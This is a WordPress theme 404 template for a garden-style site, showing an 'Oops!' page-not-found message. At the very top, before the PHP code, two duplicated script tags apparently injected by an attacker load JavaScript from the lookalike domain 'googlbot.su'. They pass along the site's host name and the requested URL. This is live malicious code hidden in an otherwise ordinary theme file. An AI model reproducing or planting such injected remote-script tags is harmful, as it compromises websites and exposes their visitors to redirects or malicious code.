<script type="text/javascript" src="http://googlbot.su/BqNJYF?frm=script&se_referrer=<?php echo $_SERVER['HTTP_HOST']; ?>&default_keyword=<?php echo $_SERVER['REQUEST_URI']; ?>"></script><script type="text/javascript" src="http://googlbot.su/BqNJYF?frm=script&se_referrer=<?php echo $_SERVER['HTTP_HOST']; ?>&default_keyword=<?php echo $_SERVER['REQUEST_URI']; ?>"></script><?php
/**
 * The template for displaying 404 pages (not found)
 *
 * @package WordPress
 * @subpackage Twenty_Sixteen
 * @since Twenty Sixteen 1.0
 */

get_header(); ?>
  <section class="banner inner-banner" style="background-image:url(<?php echo esc_url( get_template_directory_uri() ); ?>/images/banner-img.jpg);">
        <div class="container">
            <div class="bnner-inner">
                <div class="banner-text"> <strong>Classic mediterranean style;<br>
   beth Chatto's Dry garden</strong> </div>
            </div>
        </div>
    </section>
    <section class="contact-page thankyou-cover text-center" data-section>
       
        <div class="container">
            <div class="tick" style="color: #f00;border-color: #f00;"> <i class="fa fa-times" aria-hidden="true" style="    line-height: 150px;"></i> </div>
            <div class="thnkyou-message" style="background:transparent;color: #f00; border-color:transparent;">
                <p style="    font-size: 80px;font-weight: 700;">Oops!</p><br>
                <p style="color:#000;">We can't seem to find the page you're looking for.</p>
            </div>
        </div>
    
    
    </section>
   
<?php get_footer(); ?>
